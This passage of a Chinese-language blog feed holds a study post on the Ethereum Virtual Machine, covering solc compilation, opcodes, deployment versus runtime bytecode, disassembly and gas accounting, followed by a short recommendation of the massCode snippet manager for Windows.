id="将Solidity编译为EVM字节码"><a href="#将Solidity编译为EVM字节码" class="headerlink" title="将Solidity编译为EVM字节码"></a>将Solidity编译为EVM字节码</h3><p>将 Solidity 源文件编译为 EVM 字节码可以通过多种方法完成。在 [intro_chapter] 中，我们使用了在线 Remix 编译器。在本章中，我们将在命令行中使用 solc 可执行文件。有关选项列表，请运行以下命令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>使用 –opcodes 命令行选项很容易生成 Solidity 源文件的原始操作码流。这个操作码流省略了一些信息（–asm 选项产生完整的信息），但是对于这个讨论来说已经足够了。例如，编译示例 Solidity 文件 Example.sol，并将操作码输出发送到名为 BytecodeDir 的目录中，可使用以下命令完成：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc -o BytecodeDir --opcodes Example.sol或者$ solc -o BytecodeDir --asm Example.sol<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>以下命令将为我们的示例程序生成字节码二进制文件：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc -o BytecodeDir --bin Example.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>生成的输出操作码文件将取决于 Solidity 源文件中包含的特定合约。我们简单的 Solidity 文件 Example.sol 只有一个合约，名为 example：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.19</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">example</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> contractOwner<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    contractOwner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如您所见，该合约所做的只是保存一个持久状态变量，该变量被设置为运行该合约的最后一个帐户的地址。</p><p>如果您查看 BytecodeDir 目录，您将看到操作码文件 example.opcode，其中包含示例合约的 EVM 操作码指令。在文本编辑器中打开 example.opcode 文件将显示以下内容：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xE JUMPI PUSH1 0x0 DUP1REVERT JUMPDEST CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH200xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH200xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH10x35 DUP1 PUSH1 0x5B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH10x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 JUMP0xb9 SWAP14 0xcb 0x1e 0xdd RETURNDATACOPY 0xec 0xe0 0x1f 0x27 0xc9 PUSH50x9C5ABCC14A NUMBER 0x5e INVALID EXTCODESIZE 0xdb 0xcf EXTCODESIZE 0x27EXTCODESIZE 0xe2 0xb8 SWAP10 0xed 0x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>使用 –asm 选项编译示例会在我们的 BytecodeDir 目录中生成一个名为 example.evm 的文件。这包含对 EVM 字节码指令的更高级别的描述，以及一些有用的注释：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">&#x2F;* &quot;Example.sol&quot;:26:132  contract example &#123;... *&#x2F;  mstore(0x40, 0x60)    &#x2F;* &quot;Example.sol&quot;:74:130  function example() &#123;... *&#x2F;  jumpi(tag_1, iszero(callvalue))  0x0  dup1  reverttag_1:    &#x2F;* &quot;Example.sol&quot;:115:125  msg.sender *&#x2F;  caller    &#x2F;* &quot;Example.sol&quot;:99:112  contractOwner *&#x2F;  0x0  dup1    &#x2F;* &quot;Example.sol&quot;:99:125  contractOwner &#x3D; msg.sender *&#x2F;  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  pop    &#x2F;* &quot;Example.sol&quot;:26:132  contract example &#123;... *&#x2F;  dataSize(sub_0)  dup1  dataOffset(sub_0)  0x0  codecopy  0x0  returnstopsub_0: assembly &#123;        &#x2F;* &quot;Example.sol&quot;:26:132  contract example &#123;... *&#x2F;      mstore(0x40, 0x60)      0x0      dup1      revert    auxdata: 0xa165627a7a7230582056b99dcb1edd3eece01f27c9649c5abcc14a435efe3b...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>–bin-runtime 选项生成机器可读的十六进制字节码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">60606040523415600e57600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550603580605b6000396000f3006060604052600080fd00a165627a7a7230582056b...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>您可以使用 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/13evm.asciidoc#evm_bytecode_overview">The EVM Instruction Set (Bytecode Operations)</a> 中给出的操作码列表详细调查此处发生的情况。然而，这是一项艰巨的任务，所以让我们从检查前四个指令开始：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这里我们有 PUSH1 后跟一个值为 0x60 的原始字节(<em>raw byte</em>)。此 EVM 指令采用程序代码中操作码后面的单个字节（作为字面值）并将其压入堆栈。可以将大小最大为 32 字节(EVM字长为256位)的值压入堆栈，如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">PUSH32 0x436f6e67726174756c6174696f6e732120536f6f6e20746f206d617374657221<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>example.opcode 中的第二个 PUSH1 操作码将 0x40 存储到堆栈顶部（将已经存在的 0x60 向下推到一个槽中）。</p><p>接下来是 MSTORE，这是一个内存存储操作，将值保存到 EVM 的内存中。<strong>它需要两个参数，并且像大多数 EVM 操作一样，从堆栈中获取它们。</strong>对于每个参数，堆栈都会“弹出”；即，堆栈上的顶部值被取出，堆栈上的所有其他值都上移一个位置。 MSTORE 的第一个参数是将要保存的值存放在内存中的字的地址。对于这个程序，我们在堆栈顶部有 0x40，因此从堆栈中删除并用作内存地址。第二个参数是要保存的值，这里是0x60。在执行 MSTORE 操作后，我们的堆栈再次为空，但我们在内存位置 0x40 处有值 0x60（十进制的 96）。</p><p>下一个操作码是 CALLVALUE，它是一个环境操作码，它将与启动此执行的消息调用一起发送的以太量（以 wei 为单位）推送到堆栈顶部。</p><p>我们可以继续以这种方式逐步执行这个程序，直到我们完全理解这段代码影响的低级状态变化，但在这个阶段它对我们没有帮助。我们将在本章稍后再讨论它。</p><h3 id="合约部署代码"><a href="#合约部署代码" class="headerlink" title="合约部署代码"></a>合约部署代码</h3><p><strong>在以太坊平台上创建和部署新合约时使用的代码与合约本身的代码之间存在重要但微妙的区别。<strong><strong>为了创建一个新合约，需要一个特殊的交易，它的 to 字段设置为特殊的 0x0 地址，其数据字段设置为合约的启动代码(initiation code)。</strong></strong>当处理这样的合约创建交易时，新合约账户的代码不是交易数据字段中的代码。相反，EVM 会使用加载到其程序代码 ROM 中的交易数据字段中的代码来实例化，然后将该部署代码的执行输出作为新合约账户的代码。这样就可以在部署时使用以太坊世界状态以编程方式初始化新合约，在合约的存储中设置值，甚至发送以太币或创建更多新合约。</strong></p><p>离线编译合约时，例如在命令行上使用 solc，你可以获取<strong>部署字节码</strong>或<strong>运行时字节码</strong>。</p><p><strong>部署字节码用于新合约账户初始化的各个方面，包括在交易调用此新合约时实际最终执行的字节码（即运行时字节码）和基于合约初始化所有内容的代码构造函数。</strong></p><p>另一方面，运行时字节码正是在调用新合约时最终被执行的字节码，仅此而已；它不包括在部署期间初始化合约所需的字节码。</p><p>让我们以我们之前创建的简单 Faucet.sol 合约为例：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// Version of Solidity compiler this program was written for</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.19</span><span class="token punctuation">;</span><span class="token comment">// Our first contract is a faucet!</span><span class="token keyword">contract</span> <span class="token class-name">Faucet</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Give out ether to anyone who asks</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> withdraw_amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Limit withdrawal amount</span>      <span class="token keyword">require</span><span class="token punctuation">(</span>withdraw_amount <span class="token operator">&lt;=</span> <span class="token number">100000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Send the amount to the address that requested it</span>      msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>withdraw_amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token comment">// Accept any incoming amount</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>要获取部署字节码，我们将运行 <code>solc --bin Faucet.sol</code>。如果我们只想要运行时字节码，我们将运行 <code>solc --bin-runtime Faucet.sol</code>。</p><p>如果您比较这些命令的输出，您将看到运行时字节码是部署字节码的子集。换句话说，运行时字节码完全包含在部署字节码中。</p><h3 id="反汇编字节码"><a href="#反汇编字节码" class="headerlink" title="反汇编字节码"></a>反汇编字节码</h3><p>反汇编 EVM 字节码是了解高级 Solidity 如何在 EVM 中起作用的好方法。您可以使用一些反汇编程序来执行此操作：</p><ul><li><a href="https://github.com/comaeio/porosity"><em>Porosity</em></a> 是一种流行的开源反编译器。</li><li><a href="https://github.com/trailofbits/ethersplay"><em>Ethersplay</em></a> 是一个反汇编程序 Binary Ninja 的 EVM 插件。</li><li><a href="https://github.com/trailofbits/ida-evm"><em>IDA-Evm</em></a> 是另一个反汇编程序 IDA 的 EVM 插件。</li></ul><p>在本节中，我们将使用 Binary Ninja 的 Ethersplay 插件并开始 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/13evm.asciidoc#Faucet_disassembled">反汇编 Faucet 运行时字节码</a>。获得 Faucet.sol 的运行时字节码后，我们可以将其输入到 Binary Ninja（加载 Ethersplay 插件后），看看 EVM 指令是什么样的。</p><img src="/2022/09/12/mastering-ethereum-the-ethereum-virtual-machine/image-20220912114702-0e5kjtm.png" class="" title="反汇编 Faucet 运行时字节码"><center> 反汇编 Faucet 运行时字节码 </center><p>当您将交易发送到与 ABI 兼容的智能合约（您可以假设所有合约都是ABI兼容的）时，交易首先与该智能合约的调度程序进行交互。调度程序读取交易的数据字段并将相关部分发送到适当的函数。我们可以在反汇编的 Faucet.sol 运行时字节码的开头看到一个调度程序的示例。在熟悉的 MSTORE 指令之后，我们看到如下指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">PUSH1 0x4CALLDATASIZELTPUSH1 0x3fJUMPI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>正如我们所见，PUSH1 0x4 将 0x4 放在栈顶，否则为空。 <strong>CALLDATASIZE 获取与交易一起发送的数据（称为 calldata）的大小（以字节为单位）并将该数字压入堆栈</strong>。执行完这些操作后，栈如下所示：</p><table><thead><tr><th>Stack</th></tr></thead><tbody><tr><td>&lt;来自 tx 的 calldata 长度&gt;</td></tr><tr><td>0x4 (函数以4个字节标识)</td></tr></tbody></table><p>下一条指令是 LT，是“小于”的缩写。 LT 指令检查栈顶项是否小于栈顶项的下一项(whether the top item on the stack is less than the next item on the stack)。在我们的例子中，它检查 CALLDATASIZE 的结果是否小于 4 个字节。</p><p><strong>为什么 EVM 会检查交易的 calldata 是否至少有 4 个字节？因为函数标识符的工作方式。</strong>每个函数由其 Keccak-256 散列的前 4 个字节标识。通过将函数的名称和它接受的参数放入 keccak256 哈希函数中，我们可以推断出它的函数标识符。在我们的例子中，我们有：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x2e1a7d4d</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>下一条指令 EQ 弹出堆栈的顶部两项并进行比较。这是调度程序主要工作的地方：<strong>它比较在事务的 msg.data 字段中发送的函数标识符是否与 withdraw(uint256) 的函数标识符匹配。</strong>如果它们相等，则 EQ 将 1 压入堆栈，最终将用于跳转到提取函数。否则，EQ 将 0 压入堆栈。</p><p>假设发送到我们合约的交易确实以 withdraw(uint256) 的函数标识符开始，我们的堆栈变成了：</p><table><thead><tr><th>Stack</th></tr></thead><tbody><tr><td>1</td></tr><tr><td>&lt;在数据中发送的函数标识符&gt;（现在已知为 0x2e1a7d4d）</td></tr></tbody></table><p>接下来，我们有 PUSH1 0x41，这是 withdraw(uint256) 函数存在于合约中的地址。在此指令之后，堆栈如下所示：</p><table><thead><tr><th>Stack</th></tr></thead><tbody><tr><td>0x41</td></tr><tr><td>1</td></tr><tr><td>在 msg.data 中发送的函数标识符</td></tr></tbody></table><p>接下来是 JUMPI 指令，它再次接受栈顶的两个元素作为参数。在这种情况下，我们有 jumpi(0x41, 1)，它告诉 EVM 执行跳转到 withdraw(uint256) 函数的位置，并且可以继续执行该函数的代码。</p><h2 id="图灵完备性和Gas"><a href="#图灵完备性和Gas" class="headerlink" title="图灵完备性和Gas"></a>图灵完备性和Gas</h2><p>正如我们已经提到的，简单来说，如果系统或编程语言可以运行任何程序，它就是图灵完备的。但是，此功能带有一个非常重要的警告：某些程序需要永远运行。一个重要的方面是，我们无法仅通过查看程序来判断它是否需要永远执行。我们必须实际执行程序并等待它完成找出。当然，如果要永远执行，我们将不得不永远等待才能找到答案。这被称为停机问题，如果不加以解决，对以太坊来说将是一个巨大的问题。</p><p>由于停机问题，以太坊世界计算机面临被要求执行永不停止的程序的风险。这可能是偶然的，也可能是恶意的。我们已经讨论过以太坊的行为就像一个单线程机器，没有任何调度程序，因此如果它陷入无限循环，这将意味着它将变得无法使用。</p><p>但是，使用 gas 有一个解决方案：<strong>如果在执行了预先指定的最大计算量之后，执行还没有结束，则 EVM 会暂停程序的执行</strong>。这使得 EVM 成为一个准图灵完备的机器：它可以运行您输入其中的任何程序，但前提是程序在特定的计算量内终止。这个限制在以太坊中不是固定的 —— 你可以付费将其增加到最大值（称为“block gas limit”），并且每个人都可以同意随着时间的推移增加这个最大值。然而，在任何时候，都有一个限制，在执行时消耗过多gas的交易会被暂停。</p><p>在接下来的部分中，我们将研究gas并详细研究它是如何工作的。</p><h2 id="Gas"><a href="#Gas" class="headerlink" title="Gas"></a>Gas</h2><p><strong>Gas 是以太坊的单位，用于测量在以太坊区块链上执行操作所需的计算和存储资源。</strong>与比特币的交易费用仅考虑以千字节为单位的交易大小相比，以太坊必须考虑交易和智能合约代码执行执行的每个计算步骤。</p><p><strong>交易或合约执行的每项操作都会消耗固定数量的gas。</strong>来自以太坊黄皮书的一些例子：</p><ul><li>添加两个数字需要 3 个 gas</li><li>计算一个 Keccak-256 散列需要 30 gas + 对于每 256 位被散列的数据收取的6 gas</li><li>发送一笔交易需要 21,000 gas</li></ul><p>Gas 是以太坊的重要组成部分，具有双重作用：作为以太坊（波动）价格与矿工工作奖励之间的缓冲，以及抵御拒绝服务攻击。为了防止网络中出现意外或恶意的无限循环或其他计算浪费，每笔交易的发起者都需要对他们愿意支付的计算量设置一个限制。因此，gas 系统阻止了攻击者发送“spam”交易，因为他们必须按比例支付他们消耗的计算、带宽和存储资源。</p><h3 id="执行期间的Gas核算"><a href="#执行期间的Gas核算" class="headerlink" title="执行期间的Gas核算"></a>执行期间的Gas核算</h3><p>当需要 EVM 来完成交易时，首先会为其提供与交易中 gas limit 指定的数量相等的 gas 供应。执行的每个操作码都有 gas 成本，因此 EVM 的 gas 供应量会随着 EVM 逐步执行程序而减少。<strong>在每次操作之前，EVM 会检查是否有足够的 gas 来支付操作的执行费用。如果没有足够的 gas，执行将停止并恢复交易。</strong></p><p><strong>如果 EVM 成功到达执行结束，并且没有用完 gas，则使用的 gas 成本作为交易费用支付给矿工</strong>，根据交易中指定的 gas 价格转换为 ether：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">miner fee &#x3D; gas cost * gas price<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><strong>gas 供应中剩余的 gas 将退还给发送方</strong>，再次根据交易中指定的 gas 价格转换为以太币：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">remaining gas &#x3D; gas limit - gas costrefunded ether &#x3D; remaining gas * gas price<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p><strong>即：对于发送交易的用户，执行合约所需要的所有 gas 都支付给矿工，初始提供的 gas 中剩余的 gas 退还给用户。</strong></p><p>如果交易在执行过程中“用尽 gas”，则操作立即终止，引发 “out of gas” 异常。交易被 revert 并且对状态的所有更改都被回滚。</p><p><strong>尽管交易不成功，但发送者将被收取交易费用，因为矿工已经完成了计算工作，并且必须为此获得补偿。</strong></p><h3 id="Gas核算注意事项"><a href="#Gas核算注意事项" class="headerlink" title="Gas核算注意事项"></a>Gas核算注意事项</h3><p>EVM 可以执行的各种操作的相对gas成本经过精心选择，以最好地保护以太坊区块链免受攻击。您可以在 [evm_opcodes_table] 中查看不同 EVM 操作码的 gas 成本详细表。</p><p>计算量更大的操作会消耗更多的气体。例如，执行 SHA3 函数（30 gas）的成本是 ADD 操作（3 gas）的 10 倍。更重要的是，一些操作，比如 EXP，需要根据操作数的大小额外付费。使用 EVM 内存和在合约的链上存储中存储数据也需要 gas 成本。</p><p>2016 年，当攻击者发现并利用成本不匹配时，证明了将 gas 成本与实际资源成本相匹配的重要性。攻击产生的交易计算成本非常高，并使以太坊主网几乎陷入停顿。这种不匹配通过调整相对gas成本的硬分叉（代号为“Tangerine Whistle”）解决。</p><h3 id="Gas成本与Gas价格"><a href="#Gas成本与Gas价格" class="headerlink" title="Gas成本与Gas价格"></a>Gas成本与Gas价格</h3><p>虽然 gas 成本是 EVM 中使用的计算和存储的衡量标准，但 gas 本身也有以 ether 为单位的价格。在执行交易时，发送者指定他们愿意为每单位 gas 支付的 gas 价格（以 ether 为单位），从而<strong>允许市场决定 ether 价格与计算操作成本（以 gas 衡量）之间的关系</strong>：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">transaction fee &#x3D; total gas used * gas price paid  (in ether)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>在构建新区块时，以太坊网络上的矿工可以通过选择那些<strong>提供更高 gas 价格</strong>的交易来选择待处理的交易。因此，<strong>提供更高的 gas 价格将激励矿工将您的交易包括在内并更快地得到确认。</strong></p><p>在实践中，交易的发送者将设置一个高于或等于预期使用的 gas 量的 gas limit。如果设置的 gas limit 高于所消耗的 gas 量，发送方将收到超出部分的退款，因为矿工只会根据他们实际执行的工作获得补偿。</p><p>重要的是要明确 <em>gas cost</em> 和 <em>gas price</em> 之间的区别。回顾一下：</p><ul><li>gas cost 是执行特定操作所需的 <strong>gas 单位数</strong>。</li><li>gas price 是当您将交易发送到以太坊网络时，您<strong>愿意为每单位天然气支付的以太币数量</strong>。</li></ul><table><thead><tr><th>Tip</th><th>虽然 gas 是有价格的，但它不能“拥有”或“花费”。 Gas 仅存在于 EVM 内部，用于计算正在执行的计算工作量。向发送者收取以太币交易费，然后将其转换为用于 EVM 核算的 gas，然后作为支付给矿工的交易费返回以太币。</th></tr></thead></table><h4 id="负-gas-cost"><a href="#负-gas-cost" class="headerlink" title="负 gas cost"></a>负 gas cost</h4><p>以太坊通过退还合约执行期间使用的一些 gas 来鼓励删除使用的存储变量和帐户。</p><p>在 EVM 中有两个负 gas cost 的操作：</p><ul><li>删除合约 (SELFDESTRUCT) 价值 24,000 gas 的退款。</li><li>将存储地址从非零值更改为零 (SSTORE[x] &#x3D; 0) 返还 15,000 个 gas。</li></ul><p>为避免利用退款机制，交易的最大退款设置为所用gas总量的一半（向下取整）。</p><h3 id="区块Gas限制-Block-Gas-Limit"><a href="#区块Gas限制-Block-Gas-Limit" class="headerlink" title="区块Gas限制(Block Gas Limit)"></a>区块Gas限制(Block Gas Limit)</h3><p>区块 Gas 限制是一个区块中所有交易可能消耗的最大 Gas 量，并限制了一个区块可以容纳多少交易。</p><p>例如，假设我们有 5 笔交易，其 gas limit 已设置为 30,000、30,000、40,000、50,000 和 50,000。如果区块gas限制为 180,000，那么这些交易中的任何四个都可以放入一个区块中，而第五个则必须等待未来的区块。如前所述，矿工决定将哪些交易包含在一个区块中。不同的矿工可能会选择不同的组合，主要是因为他们以不同的顺序从网络接收交易。</p><p>如果矿工试图包含一个需要比当前区块gas限制更多的gas的交易，该区块将被网络拒绝。大多数以太坊客户端会通过发出“transaction exceeds block gas limit”的警告来阻止您发出此类交易。根据 <a href="https://etherscan.io/">https://etherscan.io</a> 的数据，在撰写本文时，以太坊主网上的区块 Gas 上限为 800 万，这意味着大约 380 笔基本交易（每笔交易消耗 21,000 笔天然气）可以放入一个区块中。</p><h4 id="谁来决定区块Gas限制是多少？"><a href="#谁来决定区块Gas限制是多少？" class="headerlink" title="谁来决定区块Gas限制是多少？"></a>谁来决定区块Gas限制是多少？</h4><p>网络上的矿工共同决定区块 Gas 限制。想要在以太坊网络上挖矿的个人使用挖矿程序，例如 Ethminer，它连接到 Geth 或 Parity 以太坊客户端。以太坊协议有一个内置机制，矿工可以对gas限制进行投票，以便在后续区块中增加或减少容量。一个区块的矿工可以投票决定在任一方向将区块gas限制调整 1&#x2F;1,024 (0.0976%)。其结果是可根据当时网络的需要调整块大小。该机制与默认挖矿策略相结合，矿工对至少 470 万 gas 的 gas 限制进行投票，但其目标是每块最近总 gas 使用量平均值的 150%（使用 1,024 块指数移动平均）。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在本章中，我们探索了以太坊虚拟机，跟踪各种智能合约的执行，并了解 EVM 如何执行字节码。我们还研究了 EVM 的记账机制 Gas，并了解它如何解决停机问题并保护以太坊免受拒绝服务攻击。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;精通以太坊：以太坊虚拟机&quot;&gt;&lt;a href=&quot;#精通以太坊：以太坊虚拟机&quot; class=&quot;headerlink&quot; title=&quot;精通以太坊：以太坊虚拟机&quot;&gt;&lt;/a&gt;精通以太坊：以太坊虚拟机&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文内容是对 &lt;a href=&quot;h</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="精通以太坊" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E7%B2%BE%E9%80%9A%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
  </entry>
  
  <entry>
    <title>Windows 代码片段管理工具</title>
    <link href="https://alphafitz.com/2022/09/01/tools-win-code-snippets-manager/"/>
    <id>https://alphafitz.com/2022/09/01/tools-win-code-snippets-manager/</id>
    <published>2022-09-01T09:13:43.000Z</published>
    <updated>2022-09-05T02:47:11.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-代码片段管理工具"><a href="#Windows-代码片段管理工具" class="headerlink" title="Windows 代码片段管理工具"></a>Windows 代码片段管理工具</h1><p>在编写程序时，养成保留常用代码片段的习惯通常可以为我们节省一定的时间。在网上一款颇受好评的代码片段管理工具是 SnippetsLab，但是这款工具只能在 Mac 上使用。如果你使用的是 Windows 并且有对应需求，不妨用几分钟尝试一下本文推荐的 <a href="https://masscode.io/">massCode</a>。</p><h2 id="massCode-特点"><a href="#massCode-特点" class="headerlink" title="massCode 特点"></a>massCode 特点</h2><ul><li>免费使用，接收捐赠，目前开发者已全职开发该软件</li><li>代码片段以 json 文件的格式存储在本地</li><li>使用多级文件夹和标签来组织片段，</li><li>可以使用各种云同步服务来同步代码片段文件夹</li><li>支持 VSCode、Raycast 和 Alfred 的扩展</li><li>可以实时查看 HTML 和 CSS 的实时渲染结果</li><li>使用操作可以查看<a href="https://masscode.io/documentation/">文档</a></li><li>界面相对好看但是不能定义热键</li><li>目前仍然功能较少，但功能少也就简单，不用10分钟就能上手</li><li>未来功能应该会逐渐增加，作者正在积极开发该项目</li></ul><h2 id="massCode-如何使用"><a href="#massCode-如何使用" class="headerlink" title="massCode 如何使用"></a>massCode 如何使用</h2><p>以 Windows10 和 VSCode 为例：</p><ul><li>下载安装 massCode 软件并运行</li><li>可以在 massCode -&gt; Preferences -&gt; Language 处选择中文</li><li>在 VSCode 中安装 massCode assistant 插件</li><li>在 VSCode 文件中：<code>ctrl + P</code> 选择 <code>&gt;massCode: Search</code> 即可选择代码库中的代码片段</li><li>在 VSCode 文件中：选中代码片段，<code>ctrl + P</code> 选择 <code>&gt;massCode: Create Snippet</code> 即可创建代码片段</li><li>创建后的代码片段在 <code>库 -&gt; 暂存区</code> 中，稍后可以整理到左边栏的文件夹中</li><li>注意：VSCode 在编写代码时，massCode 软件需要保持运行</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-代码片段管理工具&quot;&gt;&lt;a href=&quot;#Windows-代码片段管理工具&quot; class=&quot;headerlink&quot; title=&quot;Windows 代码片段管理工具&quot;&gt;&lt;/a&gt;Windows 代码片段管理工具&lt;/h1&gt;&lt;p&gt;在编写程序时，养成保留常用代</summary>
      
    
    
    
    <category term="开发工具" scheme="https://alphafitz.com/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="开发工具" scheme="https://alphafitz.com/tags/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
